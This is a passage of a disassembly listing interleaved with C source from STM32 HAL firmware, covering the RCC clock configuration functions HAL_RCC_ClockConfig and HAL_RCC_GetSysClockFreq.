 800430c:	e000      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 800430e:	2300      	movs	r3, #0
}
 8004310:	4618      	mov	r0, r3
 8004312:	3720      	adds	r7, #32
 8004314:	46bd      	mov	sp, r7
 8004316:	bd80      	pop	{r7, pc}
 8004318:	40021000 	.word	0x40021000
 800431c:	feeefffc 	.word	0xfeeefffc

08004320 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 8004320:	b580      	push	{r7, lr}
 8004322:	b084      	sub	sp, #16
 8004324:	af00      	add	r7, sp, #0
 8004326:	6078      	str	r0, [r7, #4]
 8004328:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 800432a:	687b      	ldr	r3, [r7, #4]
 800432c:	2b00      	cmp	r3, #0
 800432e:	d101      	bne.n	8004334 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 8004330:	2301      	movs	r3, #1
 8004332:	e0e7      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 8004334:	4b75      	ldr	r3, [pc, #468]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004336:	681b      	ldr	r3, [r3, #0]
 8004338:	f003 0307 	and.w	r3, r3, #7
 800433c:	683a      	ldr	r2, [r7, #0]
 800433e:	429a      	cmp	r2, r3
 8004340:	d910      	bls.n	8004364 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004342:	4b72      	ldr	r3, [pc, #456]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004344:	681b      	ldr	r3, [r3, #0]
 8004346:	f023 0207 	bic.w	r2, r3, #7
 800434a:	4970      	ldr	r1, [pc, #448]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 800434c:	683b      	ldr	r3, [r7, #0]
 800434e:	4313      	orrs	r3, r2
 8004350:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004352:	4b6e      	ldr	r3, [pc, #440]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004354:	681b      	ldr	r3, [r3, #0]
 8004356:	f003 0307 	and.w	r3, r3, #7
 800435a:	683a      	ldr	r2, [r7, #0]
 800435c:	429a      	cmp	r2, r3
 800435e:	d001      	beq.n	8004364 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 8004360:	2301      	movs	r3, #1
 8004362:	e0cf      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004364:	687b      	ldr	r3, [r7, #4]
 8004366:	681b      	ldr	r3, [r3, #0]
 8004368:	f003 0302 	and.w	r3, r3, #2
 800436c:	2b00      	cmp	r3, #0
 800436e:	d010      	beq.n	8004392 <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004370:	687b      	ldr	r3, [r7, #4]
 8004372:	689a      	ldr	r2, [r3, #8]
 8004374:	4b66      	ldr	r3, [pc, #408]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004376:	689b      	ldr	r3, [r3, #8]
 8004378:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800437c:	429a      	cmp	r2, r3
 800437e:	d908      	bls.n	8004392 <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004380:	4b63      	ldr	r3, [pc, #396]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004382:	689b      	ldr	r3, [r3, #8]
 8004384:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004388:	687b      	ldr	r3, [r7, #4]
 800438a:	689b      	ldr	r3, [r3, #8]
 800438c:	4960      	ldr	r1, [pc, #384]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 800438e:	4313      	orrs	r3, r2
 8004390:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 8004392:	687b      	ldr	r3, [r7, #4]
 8004394:	681b      	ldr	r3, [r3, #0]
 8004396:	f003 0301 	and.w	r3, r3, #1
 800439a:	2b00      	cmp	r3, #0
 800439c:	d04c      	beq.n	8004438 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 800439e:	687b      	ldr	r3, [r7, #4]
 80043a0:	685b      	ldr	r3, [r3, #4]
 80043a2:	2b03      	cmp	r3, #3
 80043a4:	d107      	bne.n	80043b6 <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80043a6:	4b5a      	ldr	r3, [pc, #360]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80043a8:	681b      	ldr	r3, [r3, #0]
 80043aa:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80043ae:	2b00      	cmp	r3, #0
 80043b0:	d121      	bne.n	80043f6 <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 80043b2:	2301      	movs	r3, #1
 80043b4:	e0a6      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 80043b6:	687b      	ldr	r3, [r7, #4]
 80043b8:	685b      	ldr	r3, [r3, #4]
 80043ba:	2b02      	cmp	r3, #2
 80043bc:	d107      	bne.n	80043ce <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 80043be:	4b54      	ldr	r3, [pc, #336]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80043c0:	681b      	ldr	r3, [r3, #0]
 80043c2:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80043c6:	2b00      	cmp	r3, #0
 80043c8:	d115      	bne.n	80043f6 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80043ca:	2301      	movs	r3, #1
 80043cc:	e09a      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 80043ce:	687b      	ldr	r3, [r7, #4]
 80043d0:	685b      	ldr	r3, [r3, #4]
 80043d2:	2b00      	cmp	r3, #0
 80043d4:	d107      	bne.n	80043e6 <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 80043d6:	4b4e      	ldr	r3, [pc, #312]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80043d8:	681b      	ldr	r3, [r3, #0]
 80043da:	f003 0302 	and.w	r3, r3, #2
 80043de:	2b00      	cmp	r3, #0
 80043e0:	d109      	bne.n	80043f6 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80043e2:	2301      	movs	r3, #1
 80043e4:	e08e      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 80043e6:	4b4a      	ldr	r3, [pc, #296]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80043e8:	681b      	ldr	r3, [r3, #0]
 80043ea:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80043ee:	2b00      	cmp	r3, #0
 80043f0:	d101      	bne.n	80043f6 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 80043f2:	2301      	movs	r3, #1
 80043f4:	e086      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 80043f6:	4b46      	ldr	r3, [pc, #280]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80043f8:	689b      	ldr	r3, [r3, #8]
 80043fa:	f023 0203 	bic.w	r2, r3, #3
 80043fe:	687b      	ldr	r3, [r7, #4]
 8004400:	685b      	ldr	r3, [r3, #4]
 8004402:	4943      	ldr	r1, [pc, #268]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004404:	4313      	orrs	r3, r2
 8004406:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004408:	f7fc fff2 	bl	80013f0 <HAL_GetTick>
 800440c:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800440e:	e00a      	b.n	8004426 <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 8004410:	f7fc ffee 	bl	80013f0 <HAL_GetTick>
 8004414:	4602      	mov	r2, r0
 8004416:	68fb      	ldr	r3, [r7, #12]
 8004418:	1ad3      	subs	r3, r2, r3
 800441a:	f241 3288 	movw	r2, #5000	; 0x1388
 800441e:	4293      	cmp	r3, r2
 8004420:	d901      	bls.n	8004426 <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 8004422:	2303      	movs	r3, #3
 8004424:	e06e      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 8004426:	4b3a      	ldr	r3, [pc, #232]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004428:	689b      	ldr	r3, [r3, #8]
 800442a:	f003 020c 	and.w	r2, r3, #12
 800442e:	687b      	ldr	r3, [r7, #4]
 8004430:	685b      	ldr	r3, [r3, #4]
 8004432:	009b      	lsls	r3, r3, #2
 8004434:	429a      	cmp	r2, r3
 8004436:	d1eb      	bne.n	8004410 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004438:	687b      	ldr	r3, [r7, #4]
 800443a:	681b      	ldr	r3, [r3, #0]
 800443c:	f003 0302 	and.w	r3, r3, #2
 8004440:	2b00      	cmp	r3, #0
 8004442:	d010      	beq.n	8004466 <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 8004444:	687b      	ldr	r3, [r7, #4]
 8004446:	689a      	ldr	r2, [r3, #8]
 8004448:	4b31      	ldr	r3, [pc, #196]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 800444a:	689b      	ldr	r3, [r3, #8]
 800444c:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004450:	429a      	cmp	r2, r3
 8004452:	d208      	bcs.n	8004466 <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8004454:	4b2e      	ldr	r3, [pc, #184]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004456:	689b      	ldr	r3, [r3, #8]
 8004458:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800445c:	687b      	ldr	r3, [r7, #4]
 800445e:	689b      	ldr	r3, [r3, #8]
 8004460:	492b      	ldr	r1, [pc, #172]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 8004462:	4313      	orrs	r3, r2
 8004464:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 8004466:	4b29      	ldr	r3, [pc, #164]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004468:	681b      	ldr	r3, [r3, #0]
 800446a:	f003 0307 	and.w	r3, r3, #7
 800446e:	683a      	ldr	r2, [r7, #0]
 8004470:	429a      	cmp	r2, r3
 8004472:	d210      	bcs.n	8004496 <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004474:	4b25      	ldr	r3, [pc, #148]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004476:	681b      	ldr	r3, [r3, #0]
 8004478:	f023 0207 	bic.w	r2, r3, #7
 800447c:	4923      	ldr	r1, [pc, #140]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 800447e:	683b      	ldr	r3, [r7, #0]
 8004480:	4313      	orrs	r3, r2
 8004482:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 8004484:	4b21      	ldr	r3, [pc, #132]	; (800450c <HAL_RCC_ClockConfig+0x1ec>)
 8004486:	681b      	ldr	r3, [r3, #0]
 8004488:	f003 0307 	and.w	r3, r3, #7
 800448c:	683a      	ldr	r2, [r7, #0]
 800448e:	429a      	cmp	r2, r3
 8004490:	d001      	beq.n	8004496 <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 8004492:	2301      	movs	r3, #1
 8004494:	e036      	b.n	8004504 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8004496:	687b      	ldr	r3, [r7, #4]
 8004498:	681b      	ldr	r3, [r3, #0]
 800449a:	f003 0304 	and.w	r3, r3, #4
 800449e:	2b00      	cmp	r3, #0
 80044a0:	d008      	beq.n	80044b4 <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 80044a2:	4b1b      	ldr	r3, [pc, #108]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80044a4:	689b      	ldr	r3, [r3, #8]
 80044a6:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 80044aa:	687b      	ldr	r3, [r7, #4]
 80044ac:	68db      	ldr	r3, [r3, #12]
 80044ae:	4918      	ldr	r1, [pc, #96]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80044b0:	4313      	orrs	r3, r2
 80044b2:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 80044b4:	687b      	ldr	r3, [r7, #4]
 80044b6:	681b      	ldr	r3, [r3, #0]
 80044b8:	f003 0308 	and.w	r3, r3, #8
 80044bc:	2b00      	cmp	r3, #0
 80044be:	d009      	beq.n	80044d4 <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 80044c0:	4b13      	ldr	r3, [pc, #76]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80044c2:	689b      	ldr	r3, [r3, #8]
 80044c4:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 80044c8:	687b      	ldr	r3, [r7, #4]
 80044ca:	691b      	ldr	r3, [r3, #16]
 80044cc:	00db      	lsls	r3, r3, #3
 80044ce:	4910      	ldr	r1, [pc, #64]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80044d0:	4313      	orrs	r3, r2
 80044d2:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80044d4:	f000 f824 	bl	8004520 <HAL_RCC_GetSysClockFreq>
 80044d8:	4602      	mov	r2, r0
 80044da:	4b0d      	ldr	r3, [pc, #52]	; (8004510 <HAL_RCC_ClockConfig+0x1f0>)
 80044dc:	689b      	ldr	r3, [r3, #8]
 80044de:	091b      	lsrs	r3, r3, #4
 80044e0:	f003 030f 	and.w	r3, r3, #15
 80044e4:	490b      	ldr	r1, [pc, #44]	; (8004514 <HAL_RCC_ClockConfig+0x1f4>)
 80044e6:	5ccb      	ldrb	r3, [r1, r3]
 80044e8:	f003 031f 	and.w	r3, r3, #31
 80044ec:	fa22 f303 	lsr.w	r3, r2, r3
 80044f0:	4a09      	ldr	r2, [pc, #36]	; (8004518 <HAL_RCC_ClockConfig+0x1f8>)
 80044f2:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 80044f4:	4b09      	ldr	r3, [pc, #36]	; (800451c <HAL_RCC_ClockConfig+0x1fc>)
 80044f6:	681b      	ldr	r3, [r3, #0]
 80044f8:	4618      	mov	r0, r3
 80044fa:	f7fc ff29 	bl	8001350 <HAL_InitTick>
 80044fe:	4603      	mov	r3, r0
 8004500:	72fb      	strb	r3, [r7, #11]

  return status;
 8004502:	7afb      	ldrb	r3, [r7, #11]
}
 8004504:	4618      	mov	r0, r3
 8004506:	3710      	adds	r7, #16
 8004508:	46bd      	mov	sp, r7
 800450a:	bd80      	pop	{r7, pc}
 800450c:	40022000 	.word	0x40022000
 8004510:	40021000 	.word	0x40021000
 8004514:	0800d474 	.word	0x0800d474
 8004518:	20000000 	.word	0x20000000
 800451c:	20000004 	.word	0x20000004

08004520 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 8004520:	b480      	push	{r7}
 8004522:	b089      	sub	sp, #36	; 0x24
 8004524:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 8004526:	2300      	movs	r3, #0
 8004528:	61fb      	str	r3, [r7, #28]
 800452a:	2300      	movs	r3, #0
 800452c:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 800452e:	4b3e      	ldr	r3, [pc, #248]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 8004530:	689b      	ldr	r3, [r3, #8]
 8004532:	f003 030c 	and.w	r3, r3, #12
 8004536:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 8004538:	4b3b      	ldr	r3, [pc, #236]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 800453a:	68db      	ldr	r3, [r3, #12]
 800453c:	f003 0303 	and.w	r3, r3, #3
 8004540:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8004542:	693b      	ldr	r3, [r7, #16]
 8004544:	2b00      	cmp	r3, #0
 8004546:	d005      	beq.n	8004554 <HAL_RCC_GetSysClockFreq+0x34>
 8004548:	693b      	ldr	r3, [r7, #16]
 800454a:	2b0c      	cmp	r3, #12
 800454c:	d121      	bne.n	8004592 <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 800454e:	68fb      	ldr	r3, [r7, #12]
 8004550:	2b01      	cmp	r3, #1
 8004552:	d11e      	bne.n	8004592 <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 8004554:	4b34      	ldr	r3, [pc, #208]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 8004556:	681b      	ldr	r3, [r3, #0]
 8004558:	f003 0308 	and.w	r3, r3, #8
 800455c:	2b00      	cmp	r3, #0
 800455e:	d107      	bne.n	8004570 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004560:	4b31      	ldr	r3, [pc, #196]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 8004562:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8004566:	0a1b      	lsrs	r3, r3, #8
 8004568:	f003 030f 	and.w	r3, r3, #15
 800456c:	61fb      	str	r3, [r7, #28]
 800456e:	e005      	b.n	800457c <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004570:	4b2d      	ldr	r3, [pc, #180]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 8004572:	681b      	ldr	r3, [r3, #0]
 8004574:	091b      	lsrs	r3, r3, #4
 8004576:	f003 030f 	and.w	r3, r3, #15
 800457a:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 800457c:	4a2b      	ldr	r2, [pc, #172]	; (800462c <HAL_RCC_GetSysClockFreq+0x10c>)
 800457e:	69fb      	ldr	r3, [r7, #28]
 8004580:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8004584:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004586:	693b      	ldr	r3, [r7, #16]
 8004588:	2b00      	cmp	r3, #0
 800458a:	d10d      	bne.n	80045a8 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 800458c:	69fb      	ldr	r3, [r7, #28]
 800458e:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004590:	e00a      	b.n	80045a8 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 8004592:	693b      	ldr	r3, [r7, #16]
 8004594:	2b04      	cmp	r3, #4
 8004596:	d102      	bne.n	800459e <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004598:	4b25      	ldr	r3, [pc, #148]	; (8004630 <HAL_RCC_GetSysClockFreq+0x110>)
 800459a:	61bb      	str	r3, [r7, #24]
 800459c:	e004      	b.n	80045a8 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 800459e:	693b      	ldr	r3, [r7, #16]
 80045a0:	2b08      	cmp	r3, #8
 80045a2:	d101      	bne.n	80045a8 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 80045a4:	4b23      	ldr	r3, [pc, #140]	; (8004634 <HAL_RCC_GetSysClockFreq+0x114>)
 80045a6:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 80045a8:	693b      	ldr	r3, [r7, #16]
 80045aa:	2b0c      	cmp	r3, #12
 80045ac:	d134      	bne.n	8004618 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 80045ae:	4b1e      	ldr	r3, [pc, #120]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 80045b0:	68db      	ldr	r3, [r3, #12]
 80045b2:	f003 0303 	and.w	r3, r3, #3
 80045b6:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 80045b8:	68bb      	ldr	r3, [r7, #8]
 80045ba:	2b02      	cmp	r3, #2
 80045bc:	d003      	beq.n	80045c6 <HAL_RCC_GetSysClockFreq+0xa6>
 80045be:	68bb      	ldr	r3, [r7, #8]
 80045c0:	2b03      	cmp	r3, #3
 80045c2:	d003      	beq.n	80045cc <HAL_RCC_GetSysClockFreq+0xac>
 80045c4:	e005      	b.n	80045d2 <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 80045c6:	4b1a      	ldr	r3, [pc, #104]	; (8004630 <HAL_RCC_GetSysClockFreq+0x110>)
 80045c8:	617b      	str	r3, [r7, #20]
      break;
 80045ca:	e005      	b.n	80045d8 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 80045cc:	4b19      	ldr	r3, [pc, #100]	; (8004634 <HAL_RCC_GetSysClockFreq+0x114>)
 80045ce:	617b      	str	r3, [r7, #20]
      break;
 80045d0:	e002      	b.n	80045d8 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 80045d2:	69fb      	ldr	r3, [r7, #28]
 80045d4:	617b      	str	r3, [r7, #20]
      break;
 80045d6:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 80045d8:	4b13      	ldr	r3, [pc, #76]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 80045da:	68db      	ldr	r3, [r3, #12]
 80045dc:	091b      	lsrs	r3, r3, #4
 80045de:	f003 0307 	and.w	r3, r3, #7
 80045e2:	3301      	adds	r3, #1
 80045e4:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 80045e6:	4b10      	ldr	r3, [pc, #64]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 80045e8:	68db      	ldr	r3, [r3, #12]
 80045ea:	0a1b      	lsrs	r3, r3, #8
 80045ec:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 80045f0:	697a      	ldr	r2, [r7, #20]
 80045f2:	fb03 f202 	mul.w	r2, r3, r2
 80045f6:	687b      	ldr	r3, [r7, #4]
 80045f8:	fbb2 f3f3 	udiv	r3, r2, r3
 80045fc:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 80045fe:	4b0a      	ldr	r3, [pc, #40]	; (8004628 <HAL_RCC_GetSysClockFreq+0x108>)
 8004600:	68db      	ldr	r3, [r3, #12]
 8004602:	0e5b      	lsrs	r3, r3, #25
 8004604:	f003 0303 	and.w	r3, r3, #3
 8004608:	3301      	adds	r3, #1
 800460a:	005b      	lsls	r3, r3, #1
 800460c:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 800460e:	697a      	ldr	r2, [r7, #20]
 8004610:	683b      	ldr	r3, [r7, #0]
 8004612:	fbb2 f3f3 	udiv	r3, r2, r3
 8004616:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 8004618:	69bb      	ldr	r3, [r7, #24]
}
 800461a:	4618      	mov	r0, r3
 800461c:	3724      	adds	r7, #36	; 0x24
 800461e:	46bd      	mov	sp, r7
 8004620:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004624:	4770      	bx	lr
